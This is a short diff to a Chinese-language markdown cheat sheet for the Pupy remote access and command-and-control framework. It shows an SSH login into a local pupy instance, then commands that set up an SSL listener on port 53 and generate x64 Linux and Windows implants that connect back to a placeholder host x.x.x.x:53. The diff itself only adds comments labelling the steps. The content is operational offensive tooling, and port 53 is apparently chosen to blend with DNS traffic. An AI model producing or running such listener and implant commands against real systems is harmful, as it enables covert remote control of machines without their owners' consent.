@@ -45,12 +45,14 @@ ssh -i ~/.ssh/id_rsa_pupy -p 2022 -o stricthostkeychecking=no pupy@127.0.0.1
 
 **进入 pupy 后**
 ```bash
-# 监听器
+# remove监听器
 listen -r ssl
+# 监听 53 端口
 listen -a ssl 53
 
-# 生成 shell
+# 生成 shell(linux)
 gen -f client -O linux -A x64 connect --host x.x.x.x:53 -t ssl
+# 生成 shell(windows)
 gen -f client -O windows -A x64 connect --host x.x.x.x:53 -t ssl
 ```
 
